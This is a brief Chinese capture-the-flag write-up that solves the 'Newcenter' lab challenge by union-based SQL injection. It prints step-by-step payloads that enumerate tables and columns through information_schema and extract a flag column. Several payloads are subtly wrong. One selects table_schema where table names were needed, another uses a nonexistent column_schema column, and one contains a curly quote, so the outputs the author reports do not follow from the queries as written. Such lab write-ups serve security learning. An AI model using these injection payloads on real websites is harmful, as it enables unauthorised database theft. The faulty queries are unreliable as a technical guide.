# T15 the last ONE

> 题目：攻防世界 Newcenter

__0x00 审题__

开篇search，检查是否有注入：'

很显然有注入，检查字段数

__0x01 解题__

1. 联合查询：1’ union select 1,2,3 #

> 发现有回显，直接查表，就不查数据库了

* 注：回显为2，3，很显然没有1，没事不重要，显示不出来之后记着合并就行了。（group_concat）

2. 1' union select 1,group_concat(table_schema),3 from information_schema.tables where table_schema=database() #

得到：news，secret_table

3. 查字段

```
1' union select 1,group_concat(column_schema),3 from information_schema.columns where column_schema='secret_table'and table_schema=database() #
```

得到：
id,fl4g

4. 1' union select 1,fl4g,3 from secret_table #

__0x02 总结__

这个题我竟然完全能做！！（果然还是简单了）
